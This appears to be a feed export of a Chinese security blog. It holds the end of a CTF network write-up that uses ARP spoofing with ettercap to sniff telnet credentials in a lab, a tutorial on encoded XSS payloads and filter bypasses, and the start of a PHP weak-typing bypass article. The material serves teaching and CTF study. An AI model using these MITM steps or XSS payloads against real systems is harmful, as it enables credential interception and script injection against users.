class="line">root@iZwz9hyvb5rjm3oubt8o15Z:~# ssh -i rsa.key root@172.30.0.3</span><br><span class="line"></span><br><span class="line">Welcome to Ubuntu 14.04 LTS (GNU/Linux 4.4.0-141-generic x86_64)</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">root@apacheword:~# </span><br><span class="line">$ chmod 400 rsa.key</span><br><span class="line">$ ssh -i rsa.key root@172.30.0.3</span><br></pre></td></tr></table></figure><p>成功获取到一个root权限</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">root@apacheword:~# </span><br><span class="line">root@apacheword:~# ls</span><br><span class="line">flag.txt</span><br><span class="line">root@apacheword:~# cat flag.txt  </span><br><span class="line">gigem&#123;w0rd_pr3ss_b3st_pr3ss_409186FC8E2A45FE&#125;</span><br></pre></td></tr></table></figure><h3 id="Calculator"><a href="#Calculator" class="headerlink" title="Calculator"></a>Calculator</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Using a teletype network protocol from the 70s to access a calculator from the 70s? Far out!</span><br><span class="line"></span><br><span class="line">Note to new players: You won&apos;t see anything in Wireshark / tcpdump when you initially connect. (i.e. packets are sent unicast on a bridged network)</span><br><span class="line"></span><br><span class="line">Wireshark</span><br><span class="line">tcpdump</span><br><span class="line">ettercap</span><br><span class="line">Difficulty: easy</span><br><span class="line"></span><br><span class="line">2/23 8:56 am: Added suggested tools</span><br></pre></td></tr></table></figure><p>nmap扫描<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">Nmap scan report for 172.30.0.2</span><br><span class="line">Host is up (0.33s latency).</span><br><span class="line">Not shown: 999 closed ports</span><br><span class="line">PORT   STATE SERVICE</span><br><span class="line">23/tcp open  telnet</span><br><span class="line">MAC Address: 02:42:4E:8E:83:1A (Unknown)</span><br><span class="line"></span><br><span class="line">Nmap scan report for 172.30.0.3</span><br><span class="line">Host is up (0.34s latency).</span><br><span class="line">All 1000 scanned ports on 172.30.0.3 are closed</span><br><span class="line">MAC Address: 02:42:3B:45:EB:29 (Unknown)</span><br><span class="line"></span><br><span class="line">Nmap scan report for 172.30.0.14</span><br><span class="line">Host is up (0.0000020s latency).</span><br><span class="line">All 1000 scanned ports on 172.30.0.14 are closed</span><br></pre></td></tr></table></figure></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">arpspoof -i tap0 -t 172.30.0.2  172.30.0.3</span><br></pre></td></tr></table></figure><p>直接使用arpspoof进行arp欺骗，再使用wireshark进行抓包尝试读取telnet的密码进行登入，但是并未获得想要的数据。</p><p><img src="https://i.imgur.com/dtyLMfa.png" alt=""></p><p>Telnet非常容易遭受到mitm攻击，所以这次我们尝试使用ettercap进行arp欺骗与mitm攻击，在kali上进行以下操作<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">1.ettercap -G</span><br><span class="line">2.Sniff----Unified-sniffing，然后选择网卡tap0</span><br><span class="line">3.Hosts---Scan for hosts---Hosts list，此时可以看到目标主机ip</span><br><span class="line">4.将172.30.0.2点add to target 1,将目标主机添加到目标1;选定路由，将172.30.0.2点add to target 2,将路由添加到目标2</span><br><span class="line">5.然后点mitm --- arp posoning ，勾选sniff remote connections：</span><br><span class="line">6.之后start --- start sniffing开始监听</span><br><span class="line">点view -- connections开始查看连接：</span><br><span class="line"></span><br><span class="line">可以获得172.30.0.2的Telnet信息</span><br><span class="line">7.telnet 172.30.0.2 23</span><br><span class="line">8.ls -a</span><br><span class="line">9.cat .ctf_flag</span><br></pre></td></tr></table></figure></p><p><img src="https://i.imgur.com/XT5m8wW.png" alt=""><br><img src="https://i.imgur.com/JEnG5N4.png" alt=""><br>成功读取到flag</p><h2 id="Alt-F4-for-Ops"><a href="#Alt-F4-for-Ops" class="headerlink" title="Alt-F4 for Ops"></a>Alt-F4 for Ops</h2><p>依旧是首先nmap一下。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -Pn 172.30.0.0/28</span><br></pre></td></tr></table></figure></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line">Nmap scan report for 172.30.0.2</span><br><span class="line">...</span><br><span class="line">23/tcp open  telnet</span><br><span class="line">MAC Address: 02:42:4E:8E:83:1A (Unknown)</span><br><span class="line"></span><br><span class="line">Nmap scan report for 172.30.0.3</span><br><span class="line">...</span><br><span class="line">All 1000 scanned ports on 172.30.0.3 are closed</span><br><span class="line">MAC Address: 02:42:A5:33:79:0D (Unknown)</span><br><span class="line"></span><br><span class="line">Nmap scan report for 172.30.0.14</span><br><span class="line">...</span><br><span class="line">All 1000 scanned ports on 172.30.0.14 are closed</span><br><span class="line"></span><br><span class="line">Nmap done: 16 IP addresses (3 hosts up) scanned in 146.64 seconds</span><br></pre></td></tr></table></figure><p>尝试使用ettercap进行arp欺骗与mitm攻击。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">1.ettercap -G</span><br><span class="line">2.Sniff----Unified-sniffing，然后选择网卡tap0</span><br><span class="line">3.Hosts---Scan for hosts---Hosts list，此时可以看到目标主机ip</span><br><span class="line">4.将172.30.0.2点add to target 1,将目标主机添加到目标1;选定路由，将172.30.0.2点add to target 2,将路由添加到目标2</span><br><span class="line">5.然后点mitm --- arp posoning ，勾选sniff remote connections：</span><br><span class="line">6.之后start --- start sniffing开始监听</span><br><span class="line">点view -- connections开始查看连接：</span><br></pre></td></tr></table></figure><p>…<br>…<br>…<br>…</p><h2 id="资料"><a href="#资料" class="headerlink" title="资料"></a>资料</h2><blockquote><p><a href="https://blog.csdn.net/rectsuly/article/details/63261412" target="_blank" rel="noopener">https://blog.csdn.net/rectsuly/article/details/63261412</a></p></blockquote>]]></content>
    
    <summary type="html">
    
      tamuctf Network部分wp。
    
    </summary>
    
      <category term="文章" scheme="https://museljh.github.io/categories/%E6%96%87%E7%AB%A0/"/>
    
    
      <category term="内网穿透" scheme="https://museljh.github.io/tags/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>探索xss中的编码原理</title>
    <link href="https://museljh.github.io/2019/03/06/%E6%8E%A2%E7%B4%A2xss%E4%B8%AD%E7%9A%84%E7%BC%96%E7%A0%81%E5%8E%9F%E7%90%86/"/>
    <id>https://museljh.github.io/2019/03/06/探索xss中的编码原理/</id>
    <published>2019-03-06T12:06:31.000Z</published>
    <updated>2019-03-06T15:07:19.231Z</updated>
    
    <content type="html"><![CDATA[<p><img src="/images/fly.png" alt=""></p><blockquote><p>JS解码</p></blockquote><p>先给出结论</p><blockquote><p>在javascript伪协议形式，全部字符串可以是任意的URL编码和实体字符。</p></blockquote><blockquote><p>在IE解析HTML时，只对所有实体编码做出解码，在解析URL时，会解码URL编码，script标签时，原始文本均不做处理！</p></blockquote><p>我们再给出下面三个test<br>Test1：URL 编码 “javascript:alert(1)”<br>URL编码“javascript:alert(1)”=“%6A%61%76%61%73%63%72%69%70%74:%61%6C%65%72%74%28%31%29”</p><p>Test2：HTML字符实体编码 “javascript” 、URL 编码 “alert(2)”<br>HTML编码”javascript”=”&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;”</p><p>URL编码”alert(2)”=” %61%6C%65%72%74%28%32%29”</p><p>Test3：对\&lt;a href=\”javascript:alert(3)\”>test3\&lt;/a>做JS编码àURL编码àHTML编码共3层。</p><p>JS编码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;a href=&quot;javascript:\u0061\u006c\u0065\u0072\u0074(3)&quot;&gt;test3&lt;/a&gt;</span><br></pre></td></tr></table></figure></p><p>URL编码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;a href=&quot;javascript:%5c%75%30%30%36%31%5c%75%30%30%36%63%5c%75%30%30%36%35%5c%75%30%30%37%32%5c%75%30%30%37%34(3)&quot;&gt;test3&lt;/a&gt;</span><br></pre></td></tr></table></figure></p><p>HTML编码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;a href=&quot;&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;&amp;#37;&amp;#53;&amp;#99;&amp;#37;&amp;#55;&amp;#53;&amp;#37;&amp;#51;&amp;#48;&amp;#37;&amp;#51;&amp;#48;&amp;#37;&amp;#51;&amp;#54;&amp;#37;&amp;#51;&amp;#49;&amp;#37;&amp;#53;&amp;#99;&amp;#37;&amp;#55;&amp;#53;&amp;#37;&amp;#51;&amp;#48;&amp;#37;&amp;#51;&amp;#48;&amp;#37;&amp;#51;&amp;#54;&amp;#37;&amp;#54;&amp;#51;&amp;#37;&amp;#53;&amp;#99;&amp;#37;&amp;#55;&amp;#53;&amp;#37;&amp;#51;&amp;#48;&amp;#37;&amp;#51;&amp;#48;&amp;#37;&amp;#51;&amp;#54;&amp;#37;&amp;#51;&amp;#53;&amp;#37;&amp;#53;&amp;#99;&amp;#37;&amp;#55;&amp;#53;&amp;#37;&amp;#51;&amp;#48;&amp;#37;&amp;#51;&amp;#48;&amp;#37;&amp;#51;&amp;#55;&amp;#37;&amp;#51;&amp;#50;&amp;#37;&amp;#53;&amp;#99;&amp;#37;&amp;#55;&amp;#53;&amp;#37;&amp;#51;&amp;#48;&amp;#37;&amp;#51;&amp;#48;&amp;#37;&amp;#51;&amp;#55;&amp;#37;&amp;#51;&amp;#52;&amp;#40;&amp;#51;&amp;#41;&quot;&gt;test3&lt;/a&gt;</span><br></pre></td></tr></table></figure></p><p>【过程分析】<br>许多童鞋把Test1放到HTML里发现脚本并没有正常执行，就会想按照刚才分析的，URL解码之后Javascript解析器完成解码操作，脚本应该会正常执行啊，这里就有一个URL解析过程中的一个细节了，不能对协议类型进行任何的编码操作，否则URL解析器会认为它无类型，就导致Test1中被编码的“javascript”没有解码，当然不会被URL解析器识别了。</p><blockquote><p>这时候我们对于为什么question3、Question 1不能xss有了足够理解了把？</p></blockquote><p>那Test2也是对javascript编码了为什么可以执行呢？因为”javascript”是做的HTML实体编码，HTML解析器工作时，href里的HTML实体会被解码，接下来URL解析器工作解析href属性里的链接时，”javascript”协议在第一步被HTML解码了，这样URL解析器是可以识别的，然后继续解析后面的”%61%6C%65%72%74%28%32%29”，最后JavaScript解析器完成解析操作，脚本执行。</p><blockquote><p>这时候我们对于为什么question2能xss有了足够理解了把？</p></blockquote><p>Test3实现了3层复合编码，每一层编码都能正常执行，并思考一下在复合编码环境中XSS防御策略不做组合编码，后果是什么呢？</p><p>我们接下来再提出几个问题<br>Question 4<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;div&gt;&amp;#60;img src=x onerror=alert(4)&amp;#62;&lt;/div&gt; </span><br><span class="line">&lt;img src=x onerror=alert(4)&gt;</span><br></pre></td></tr></table></figure></p><p>Question 5<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;textarea&gt;&amp;#60;script&amp;#62;alert(5)&amp;#60;/script&amp;#62;&lt;/textarea&gt;</span><br></pre></td></tr></table></figure></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(5)&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>Question 6<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;textarea&gt;&lt;script&gt;alert(6)&lt;/script&gt;&lt;/textarea&gt;</span><br></pre></td></tr></table></figure></p><p>答案：都不可以执行xss，并且Question 5 实体编码不会被解码<br>探索：<br>为什么呢？<br>回到我们之前所说的，浏览器，以IE为例子，拿到HTML文本代码，然后扫描寻找左尖括号&lt;，找到即开始按照后面的字符串来生成相应的对象，然后把之后属性的值“赋值”给对象相应的属性，这里说明一下，这个属性其实在内存里并不是一个直接的值，而还是一个对象。<br>假设之前的例子中在a标签中的href里，有一个&gt;符号，<br>所以现浏览器只认&lt;,<br>Question 4中这里根本没有在文本里扫描到&lt;（因为被实体编码了），故根本就不是对象，不产生IMG元素</p><p>那么问题又来了，假如说Question 5中也同样用这种方式是可以解释的通，那么为什么Question 6却无法xss弹窗呢？</p><p>这里的textarea是一个非常特殊的例子</p><p>它有一个如下的特性<br>即使将html代码段插入textarea， html代码段不会执行， 仅仅将其作为普通文本显示。<br>在Question 5、6中只扫描到了textarea类型，产生了textarea，其余字符串只是作为值字符串，值里含有&lt;字符。</p><p><img src="https://i.imgur.com/of4NVgF.png" alt=""><br>当然textarea并非是绝对安全的，它仍然会遭到xss的攻击<br>在插入textarea内容时候，提前关闭标签，然后输出script脚本，如下</p><p>即构成如下脚本<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;textarea&gt;</span><br><span class="line"></span><br><span class="line">&lt;/textarea&gt;&lt;script&gt;alert(6)&lt;/script&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;/textarea&gt;</span><br></pre></td></tr></table></figure></p><p>我们接下来继续再提出几个问题<br>Question 7<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;button onclick=&quot;confirm(&apos;7&amp;#39;);&quot;&gt;Button&lt;/button&gt;</span><br></pre></td></tr></table></figure></p><p>Question 8<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;button onclick=&quot;confirm(&apos;8\u0027);&quot;&gt;Button&lt;/button&gt;</span><br></pre></td></tr></table></figure></p><p>答案：Question 8不可以执行xss，Question 7可以执行xss<br>探索：<br>为什么呢？<br>因为onclick是事件触发情形，而事件触发的情况下只解码实体编码<br>所以对于Question 7来说进行HTML解码后就原始文本所以是可以被执行的，但是对于Question 8就不行了<br>是不是对这两个问题有了一定了解了呢？</p><p>我们接下来继续提出一系列问题<br>Question 9<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(9);&lt;/script&gt;</span><br></pre></td></tr></table></figure></p><p>Question 10<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;\u0061\u006c\u0065\u0072\u0074(10);&lt;/script&gt;</span><br></pre></td></tr></table></figure></p><p>Question 11<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;\u0061\u006c\u0065\u0072\u0074\u0028\u0031\u0031\u0029\u003b&lt;/script&gt;</span><br></pre></td></tr></table></figure></p><p>Question 12<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;\u0061\u006c\u0065\u0072\u0074(\u0031\u0032);&lt;/script&gt;</span><br></pre></td></tr></table></figure></p><p>Question 13<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(&apos;13\u0027)&lt;/script&gt;</span><br></pre></td></tr></table></figure></p><p>Question 14<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(&apos;14\u000a&apos;)&lt;/script&gt;</span><br></pre></td></tr></table></figure></p><p>Question 15<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116&amp;#40;&amp;#57;&amp;#41;&amp;#59&lt;/script&gt;</span><br></pre></td></tr></table></figure></p><p>答案：只有9、10、14可以进行xss<br>探索：<br>我们在之前提到：对于script标签定义的JS,可以泛理解为IE会直接产生script对象，之后把innerHTML，也就是JS代码内容直接原封不动传给JS引擎去解释执行。</p><p>当然Question 9    在script标签里，原封不动交给js引擎。当然是可以触发xss的。<br>这里涉及到JS引擎对字符串的解码</p><p>先说question 14<br>javascript 出发了JS 解释器，JS会先对内容进行解析，里边有一个转义字符\u000a,前导的 \u 表示他是一个Unicode 字符，根据后边的数字，解析为’14 ’，于是在完成JS的解析之后变成了：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(&apos;14</span><br><span class="line">&apos;)&lt;/script&gt;</span><br></pre></td></tr></table></figure></p><p>然后JS 解释器执行alert(‘14<br>‘)，这句话会交给浏览器渲染，最终弹窗。<br>这里边会有一个看起来让人有些疑惑的东西，以question 10为例子，假如我们编码的位置不是括号里，而是在alert上，我们知道，js 是会对它进行逆转义的：<br>所以question 10 仍然是可以的<br>而另一方面，如果想用这种方式来替换掉圆括号，或者引号，会判定为失败。同时，主要注意的方式，上边这种直接在字符串外进行专一的方式，只有Unicode 转义方式呗支持，其他转义方式则不行。其实，这样的策略是正确的，<br>因为对于JavaScript，转义编码应当只出现在标示符部分，不能用于对语法有真正影响的符号，也就是括号，或者是引号</p><p>所以question 11、12、13 是不可以进行xss的<br>至于Question 15 这里采用了html编码而这里却是需要先进行js解码，所以Question 15毫无疑问也是不可以的</p><p>当然这些问题同样也是适用于javascript伪协议的，如下，当然我就不再进行解释了，原理也是一样的<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;a href=&quot;javascript:alert(&apos;&lt;一&gt;&apos;)&quot;&gt;test&lt;/a&gt;</span><br></pre></td></tr></table></figure></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&lt;a href=&quot;javascript:alert(&apos;&lt;\u4e00&gt;&apos;)&quot;&gt;test&lt;/a&gt;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&lt;a href=&quot;javascript:\u0061lert(&apos;&lt;一&gt;&apos;)&quot;&gt;test&lt;/a&gt;</span><br></pre></td></tr></table></figure><p>在一个页面中，可以出发JS 解析器的方式有这么几种</p><blockquote><p>直接嵌入&lt; script&gt; 代码块。<br>通过&lt; script sr=… &gt; 加载代码。<br>各种HTML CSS 参数支持JavaScript：URL 触发调用。<br>CSS expression(…) 语法和某些浏览器的XBL 绑定。<br>事件处理器(Event handlers),比如 onload, onerror, onclick等等。<br>定时器，Timer(setTimeout, setInterval)<br>eval(…) 调用</p></blockquote><p>最后我们再次构造两个场景</p><p>场景一：\<script>alert(‘xss’)\</script>：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">function init()</span><br><span class="line">&#123;</span><br><span class="line">document.getElementById(&quot;div1&quot;).innerHTML=&quot;&lt;script&gt;alert(&apos;aa&apos;)&lt;/script&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;body onload=init()&gt;</span><br><span class="line">&lt;div id=&quot;div1&quot;&gt;&lt;/div&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure></p><p>场景二：\<img src="’non-exist.jpg’" onerror="”alert(‘xss’)”"><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">function init()</span><br><span class="line">&#123;</span><br><span class="line">document.getElementById(&quot;div1&quot;).innerHTML=&quot;&lt;img src=&apos;aa.jpg&apos; onerror=\&quot;alert(&apos;aa&apos;)\&quot;/&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;body onload=init()&gt;</span><br><span class="line">&lt;div id=&quot;div1&quot;&gt;&lt;/div&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure></p><p>如果把这2个分别保存成HTML，但是发现第一个\<script>alert(‘xss’)\</script>不会执行，但是第二个例子是会执行的。想想看为什么？<br>Tips：</p><p>innerHTML只能使用\<img src="1onerror=alert(1)">这种方式来触发JS。而不能以\<script>alert(1)\</script>来触发，因为这种压根不会执行\<script>..\</script>之间的内容。<br>因为当我们的HTML解析器解析到\<script>标签时，它会快速去查找离它最近的闭合标签\</script>。<br>而当我们提交\<script>alert(1);\&lt;\/script&gt;,则可以正常弹框。</p><p>还是同样的解析原则，html解析引擎解析到\<script>时，它会快速去查找离它最近的闭合标签\</script>。这是在到第8行时发现&lt;\/script&gt;标签，而不是\,<br>故继续往下，直到找寻到\标签，才完成了配对。其中的代码交给了js引起去解析。由于\<script>alert(1);\&lt;\/script&gt;双引号包围，所以js解析器会把它当字符串处理。 所以最终的解析结果是第8行中的\<script>和\</script>都是字符串而不是标签。</p><p>值得注意的是第当\字符的引入使得\<script>标签在html解析引擎解析时未在最近被闭合,同时又因为\为js语法中的转义字符，故在js解析引擎解析时，又能正常解析input_str变量的值为\<script>alert(1);\</script>字符串，所以最总成功弹窗，很巧妙！</p><p>小结：<br>我们知道XSS漏洞最常见的检测方式就是输入\<script>alert(‘xss’)\</script>来确认，大部分人在测试的时候就是直接使用类似\<script>alert(‘xss’)\</script>这样的输入，如果发现有弹出对话框就说明存在漏洞，如果没有对话框就认为不存在漏洞。那么，只使用\<script>标签是否就足够了呢？</p><h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>对于xss编码的研究就先到这里了，当然xss的绕过方法不仅仅只有编码这一种，但仅仅只是编码问题，想要研究透彻还是需要一些时间的，这里我仅仅是探索一些我能够查到的资料，还有未查到的知识等着我们探索</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><blockquote><p><a href="https://blog.csdn.net/qq_35513598/article/details/79861908">https://blog.csdn.net/qq_35513598/article/details/79861908</a><br><a href="https://blog.csdn.net/czh500/article/details/79903698">https://blog.csdn.net/czh500/article/details/79903698</a><br><a href="http://test.attacker-domain.com/browserparsing/tests.html">http://test.attacker-domain.com/browserparsing/tests.html</a><br><a href="https://xz.aliyun.com/t/1556">https://xz.aliyun.com/t/1556</a><br><a href="https://shinpachi8.github.io/2017/07/28/xss%E7%BC%96%E7%A0%81/">https://shinpachi8.github.io/2017/07/28/xss%E7%BC%96%E7%A0%81/</a><br><a href="https://security.yirendai.com/news/share/26">https://security.yirendai.com/news/share/26</a><br><a href="https://www.cnblogs.com/lightsong/p/4356698.html">https://www.cnblogs.com/lightsong/p/4356698.html</a><br><a href="http://www.voidcn.com/article/p-tapgsgbo-baz.html">http://www.voidcn.com/article/p-tapgsgbo-baz.html</a><br><a href="http://gv7.me/articles/2018/escape-string-in-xss/">http://gv7.me/articles/2018/escape-string-in-xss/</a><br><a href="http://xuelinf.github.io/2016/05/18/%E7%BC%96%E7%A0%81%E4%B8%8E%E8%A7%A3%E7%A0%81-%E6%B5%8F%E8%A7%88%E5%99%A8%E5%81%9A%E4%BA%86%E4%BB%80%E4%B9%88/">http://xuelinf.github.io/2016/05/18/%E7%BC%96%E7%A0%81%E4%B8%8E%E8%A7%A3%E7%A0%81-%E6%B5%8F%E8%A7%88%E5%99%A8%E5%81%9A%E4%BA%86%E4%BB%80%E4%B9%88/</a></p></blockquote></script></p>]]></content>
    
    <summary type="html">
    
      探索xss在浏览器中是如何被渲染的。
    
    </summary>
    
      <category term="文章" scheme="https://museljh.github.io/categories/%E6%96%87%E7%AB%A0/"/>
    
    
      <category term="xss" scheme="https://museljh.github.io/tags/xss/"/>
    
  </entry>
  
  <entry>
    <title>记一次深入理解PHP弱类型原理的经历并以此第一次深入了解PHP内核</title>
    <link href="https://museljh.github.io/2019/03/04/%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3PHP%E5%BC%B1%E7%B1%BB%E5%9E%8B%E5%8E%9F%E7%90%86%E7%9A%84%E7%BB%8F%E5%8E%86%E5%B9%B6%E4%BB%A5%E6%AD%A4%E7%AC%AC%E4%B8%80%E6%AC%A1%E6%B7%B1%E5%85%A5%E4%BA%86%E8%A7%A3PHP%E5%86%85%E6%A0%B8/"/>
    <id>https://museljh.github.io/2019/03/04/记一次深入理解PHP弱类型原理的经历并以此第一次深入了解PHP内核/</id>
    <published>2019-03-04T14:44:50.000Z</published>
    <updated>2019-03-04T15:03:56.759Z</updated>
    
    <content type="html"><![CDATA[<p><img src="/images/fly.png" alt=""></p><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>在CTF比赛中PHP弱类型的特性常常被用上，但我们往往知其然不知其所以然，究竟为什么PHP是弱类型呢？很少人深究。在这次源码分析的过程中我收获很大，第一次学会了如何深入理解一个问题，虽然花费了我很多时间，但这可以说是一段非常值得的经历。</p><h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><p>首先引入一个问题，为什么以下结果是恒为真的呢？<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">var_dump([]&gt;1);</span><br><span class="line">var_dump([]&gt;0);</span><br><span class="line">var_dump([]&gt;-1);</span><br></pre></td></tr></table></figure></p><p>当然实际ctf中问题可能会如下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$_GET[Password]&gt;99999;</span><br></pre></td></tr></table></figure></p><p>当传入Password[]=1<br>时侯恒为真<br>当然再换一种形式<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var_dump([[]]&gt;[1]);</span><br></pre></td></tr></table></figure></p><p>依旧是恒为真<br>对于这类问题，很多人都是认为PHP因为它是弱类型语言它就有这种特性<br>那么为什么PHP会有这种特性呢？<br>我们首先查阅下PHP手册<br><a href="http://php.net/manual/en/language.operators.comparison.php#language.operators.comparison.types" target="_blank" rel="noopener">Comparison Operators</a><br><img src="https://i.imgur.com/RuQpofN.png" alt=""><br>在手册中写到，当array和anything进行比较的时候array is always 